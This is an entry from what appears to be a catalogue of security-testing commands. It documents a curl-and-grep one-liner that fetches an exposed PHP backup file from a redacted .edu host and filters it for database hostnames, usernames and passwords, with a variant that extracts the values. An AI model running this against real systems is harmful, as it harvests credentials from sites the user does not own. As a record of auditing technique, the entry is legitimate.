---
id: cmd-uuid-2
data: >-
  curl https://██████████.edu/database.php.orig | grep -E
  'hostname\|db\|username\|password'
tags:
  - web-recon
  - grep
  - credentials
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.355Z'
verified: false
validated: true
submitted: true
---
# curl-grep-credentials

## Command

```bash
curl https://██████████.edu/database.php.orig | grep -E 'hostname\|db\|username\|password'
```

## Description

This pipes the output of a curl fetch into grep to filter for patterns commonly associated with database credentials, aiding in quick identification of sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target URL for curl | Yes |
| -E | Extended regex pattern | Yes |

## Examples

### Basic Usage

```bash
curl https://example.com/config.php | grep -E 'hostname|db|username|password'
```

### Advanced Usage

```bash
curl https://example.com/config.php | grep -E 'hostname|db|username|password' | sed 's/.*= //'
```

## Expected Output

Lines matching the pattern, e.g., `$hostname = 'db.example.edu';`.

## Related

- [[Related Procedure: View-Source-of-PHP-Backup-File-to-Extract-Credentials]]
